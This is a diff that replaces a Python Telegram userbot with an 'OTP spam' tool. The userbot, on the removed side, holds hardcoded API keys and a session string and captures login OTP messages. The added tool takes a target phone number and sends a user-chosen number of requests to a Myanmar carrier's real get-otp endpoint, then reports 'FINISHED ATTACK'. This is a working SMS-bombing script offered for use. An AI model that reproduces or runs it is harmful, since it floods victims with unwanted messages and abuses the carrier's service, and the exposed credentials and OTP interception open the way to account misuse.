@@ -1,118 +1,102 @@
-import asyncio
-import logging
-import sys
-from datetime import datetime
+import requests
+import os
+import colorama
+from colorama import Fore,Back,Style
+import time
 
-import uvloop
-from pyrogram import Client, filters
-from pyrogram.handlers import MessageHandler
+class dev():
+    def __init__(self,telegram,Team,developer):
+        self.telegram = telegram
+        self.Team = Team
+        self.developer = developer
 
-API_ID = 33068007
-API_HASH = "f351c5a77e2c67a850d11a34958000b3"
-SESSION_STRING = "MIIBCgKCAQEAyMEdY1aR+sCR3ZSJrtztKTKqigvO/vBfqACJLZtS7QMgCGXJ6XIRyy7mx66W0/sOFa7/1mAZtEoIokDP3ShoqF4fVNb6XeqgQfaUHd8wJpDWHcR2OFwvplUUI1PLTktZ9uW2WE23b+ixNwJjJGwBDJPQEQFBE+vfmH0JP503wr5INS1poWg/j25sIWeYPHYeOrFp/eXaqhISP6G+q2IeTaWTXpwZj4LzXq5YOpk4bYEQ6mvRq7D1aHWfYmlEGepfaYR8Q0YqvvhYtMte3ITnuSJs171+GDqpdKcSwHnd6FudwGO4pcCOj4WcDuXc2CTHgH8gFTNhp/Y8/SpDOhvn9QIDAQAB"
+dp = dev('@Ace_TM0','Myanmar Cyber Security','ACE') 
 
-TELEGRAM_OTP_SENDER = 777000
-OTP_TIMEOUT = 15
-
-handler = logging.StreamHandler(sys.stdout)
-handler.setLevel(logging.INFO)
-formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
-handler.setFormatter(formatter)
-logger = logging.getLogger(__name__)
-logger.setLevel(logging.INFO)
-logger.addHandler(handler)
-logging.getLogger("pyrogram").setLevel(logging.WARNING)
-
-otp_event = asyncio.Event()
-otp_message_text = None
+banner = (Fore.BLUE + '''
 
 
-async def otp_listener(client, message):
-    global otp_message_text
-    otp_message_text = message.text
-    otp_event.set()
+ ▒█████  ▄▄▄█████▓ ██▓███       ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
+▒██▒  ██▒▓  ██▒ ▓▒▓██░  ██▒   ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
+▒██░  ██▒▒ ▓██░ ▒░▓██░ ██▓▒   ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
+▒██   ██░░ ▓██▓ ░ ▒██▄█▓▒ ▒     ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ 
+░ ████▓▒░  ▒██▒ ░ ▒██▒ ░  ░   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
+░ ▒░▒░▒░   ▒ ░░   ▒▓▒░ ░  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
+  ░ ▒ ▒░     ░    ░▒ ░        ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
+░ ░ ░ ▒    ░      ░░          ░  ░  ░  ░░         ░   ▒   ░      ░   
+    ░ ░                             ░                 ░  ░       ░   
+                                                                     
+''')
+
+def ins():
+    if os.path.exists('python3') and os.path.exists('requests') and os.path.exists('pip'):
+        print(Fore.RED + 'python - DONE')
+        print(Fore.RED + 'pip - DONE')
+        print(Fore.RED + 'requests - DONE')
+        pass
+    else:
+        os.system('pkg install python3')
+        os.system('pip --version')
+        os.system('pip install python-requests')
+        os.system('pip install colorama')
+        print('DONE')
 
 
-async def main():
-    global otp_message_text
 
-    logger.info("Creating User Client From SESSION_STRING")
+def developer():
+    print(banner)
+    print(f'''Developer      -{dp.telegram}
+Orgnization   -{dp.Team}
+Developer      -{dp.developer}
+           ''')
+    
 
-    try:
-        app = Client(
-            name="userbot_session",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            session_string=SESSION_STRING,
-            in_memory=True,
-        )
-        logger.info("User Client Created Successfully !")
-    except Exception as e:
-        logger.error(f"Failed To Create Client: {e}")
-        sys.exit(1)
+    
 
-    try:
-        await app.start()
-        logger.info("User Successfully Started 💥")
-    except Exception as e:
-        logger.error(f"Failed To Start Client: {e}")
-        sys.exit(1)
-
-    try:
-        me = await app.get_me()
-        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
-        phone = me.phone_number or "N/A"
-        username = f"@{me.username}" if me.username else "N/A"
-
-        logger.info(f'User\'s Full Name "{full_name}"')
-        logger.info(f'User\'s Number "{phone}"')
-        logger.info(f'User\'s Username "{username}"')
-    except Exception as e:
-        logger.error(f"Failed To Fetch User Info: {e}")
-        await app.stop()
-        sys.exit(1)
-
-    try:
-        answer = input("\nDo you want To login To your Account? (yes/no): ").strip().lower()
-    except (KeyboardInterrupt, EOFError):
-        logger.info("Input Cancelled. Stopping Client.")
-        await app.stop()
-        sys.exit(0)
-
-    if answer != "yes":
-        logger.info("Login Skipped. Stopping Client.")
-        await app.stop()
-        sys.exit(0)
-
-    logger.info(f"Waiting For OTP Message From Telegram (Timeout: {OTP_TIMEOUT}s)...")
-
-    otp_filter = filters.chat(TELEGRAM_OTP_SENDER) & filters.text
-    app.add_handler(MessageHandler(otp_listener, otp_filter))
-
-    try:
-        await asyncio.wait_for(otp_event.wait(), timeout=OTP_TIMEOUT)
-
-        if otp_message_text:
-            border = "─" * 50
-            print(f"\n{border}")
-            print(f"  📩 OTP MESSAGE RECEIVED")
-            print(f"{border}")
-            for line in otp_message_text.strip().split("\n"):
-                print(f"  {line}")
-            print(f"{border}\n")
-            logger.info("OTP Message Captured Successfully.")
+def main():
+    while True:
+        phone = input(Fore.GREEN +'Enter Target Phone Number(without +95): ')
+        if len(phone) == 11:
+            print(Fore.BLUE + f'Target : {phone}')
+        if len(phone) != 11 or len(phone) > 11:
+            print(Fore.RED + 'Total count is 11')
+            if phone not in '09':
+                print(Fore.RED + f'YOU need 09')
         else:
-            logger.warning("OTP Event Triggered But Message Was Empty.")
+            a = requests.get(f'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}',timeout=2)
+            s = a.status_code
+            print(f'Checking phone - {phone}')
+            time.sleep(2)
+            print(f'Check status_code : {s==200}')
+            time.sleep(2)
+            print(f'Check network : {s==200}')
+            time.sleep(2)
+            print('Checking..............................')
+            time.sleep(4)
+            
+            if s == 200:
+                print(f'Valid - {phone}')
+                count = int(input('Enter Count of OTP :'))
+                for i in range(1,count):
+                    m = requests.get(f'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}',timeout=4)
+                    ss = m.status_code
+                    if ss == 200:
+                        print(Fore.GREEN + f'OTP',i,'DONE')
+                        
+                    else:
+                        print("ERROR")
 
-    except asyncio.TimeoutError:
-        logger.error(f"Timeout! No OTP Message Received Within {OTP_TIMEOUT} Seconds.")
-    except Exception as e:
-        logger.error(f"Unexpected Error While Waiting For OTP: {e}")
-    finally:
-        await app.stop()
-        logger.info("Client Stopped Cleanly.")
+                print(Fore.RED + 'FINISHED ATTACK')            
 
+            else:
+                print(f'Invalid - {phone}')            
+                         
 
-if __name__ == "__main__":
-    uvloop.install()
-    asyncio.run(main())
+def lee():
+    ins()
+    developer()
+    main()                  
+                
+lee()                
+
+      
+    
